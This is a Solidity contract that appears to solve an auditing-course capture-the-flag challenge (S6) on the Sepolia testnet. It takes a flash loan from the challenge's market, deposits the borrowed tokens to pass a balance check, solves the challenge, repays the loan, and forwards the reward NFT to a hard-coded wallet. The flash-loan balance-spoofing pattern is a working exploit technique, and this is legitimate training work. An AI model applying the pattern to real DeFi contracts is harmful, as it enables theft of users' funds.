// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Source: https://github.com/Cyfrin/security-and-auditing-full-course-s23?tab=readme-ov-file
// Challenge S6: https://sepolia.etherscan.io/address/0xcf4fba490197452bd414e16d563623253efb57d3#code

interface IS6  { 
  // contract S6 address in Sepolia: 0xcf4fbA490197452Bd414E16D563623253eFb57D3
  function solveChallenge(string memory yourTwitterHandle) external;
  function getMarket() external view returns (address);
  function getToken() external view returns (address);
  function getBalance(address user) external view returns (uint256);

  function depositMoney(uint256 amount) external;
  function withdrawMoney() external;
}

interface IS6Market { 
    function flashLoan(uint256 amount) external;
}

interface IS6Token is IERC20 {}

contract S6_Challenge is IERC721Receiver {
    using SafeERC20 for IS6Token;

    // This is my wallet address where NFT will be stored
    address private myWallet = 0x05E3Bd725678352E24d79D2266e12129EdB69474; 

    IS6 private s6;
    IS6Market private market;
    IS6Token private s6Token;

    constructor(address _s6) {
        s6 = IS6(_s6);
        s6Token = IS6Token(s6.getToken());
        market = IS6Market(s6.getMarket());
    }

    function flashLoan() public {
        market.flashLoan(s6Token.balanceOf(address(market)));
    }

    /*
     -------------- Interface Methods --------------
    */
    function owner() external view returns (address) {
      return address(this);
    }

    function execute() external payable {
        s6Token.approve(address(s6), s6Token.balanceOf(address(this)));
        s6.depositMoney(s6Token.balanceOf(address(this)));
        s6.solveChallenge("chamdev1");

        // Withdraw amount from S6 (S6 -> this) and then repay loan (this -> market)
        s6.withdrawMoney();
        s6Token.safeTransfer(address(market), s6Token.balanceOf(address(this)));
    }
    //-----------------------------------------------


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {

      // Transfer the received ERC721 token to the specified wallet address
      IERC721(msg.sender).safeTransferFrom(address(this), myWallet, tokenId);
      return this.onERC721Received.selector;
    }
}